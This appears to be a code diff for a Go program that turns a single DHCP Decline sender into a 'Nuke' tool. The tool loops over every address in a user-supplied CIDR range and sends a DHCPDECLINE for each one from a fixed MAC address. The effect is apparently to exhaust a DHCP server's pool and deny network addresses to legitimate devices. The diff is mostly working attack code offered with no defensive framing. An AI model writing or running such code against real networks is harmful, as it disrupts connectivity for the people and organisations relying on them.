@@ -7,9 +7,36 @@ import (
 
 	"log"
 	"net"
+	"os"
 )
 
 func main() {
+	if len(os.Args) == 1 {
+		log.Fatalln("You didn't gave to me an ip range in CIDR notation. DUSHBAG!")
+		os.Exit(1)
+	}
+	toNuke := os.Args[1]
+
+	ip, ipnet, err := net.ParseCIDR(toNuke)
+	if err != nil {
+		log.Fatal(err)
+	}
+	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
+		log.Println(ip)
+		Nuke(ip)
+	}
+}
+
+func inc(ip net.IP) {
+	for j := len(ip) - 1; j >= 0; j-- {
+		ip[j]++
+		if ip[j] > 0 {
+			break
+		}
+	}
+}
+
+func Nuke(ip net.IP) {
 	var err error
 
 	m, err := net.ParseMAC("08-00-27-00-A8-E8")
@@ -29,7 +56,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("Error:%v\n", err)
 	}
-	_, err = SendDHCPDeclinePacket(exampleClient, m, net.IPv4(192, 168, 1, 250))
+	_, err = SendDHCPDeclinePacket(exampleClient, m, ip)
 	if err != nil {
 		log.Fatalf("Couldn't send DeclinePacket:" + err.Error())
 	} else {
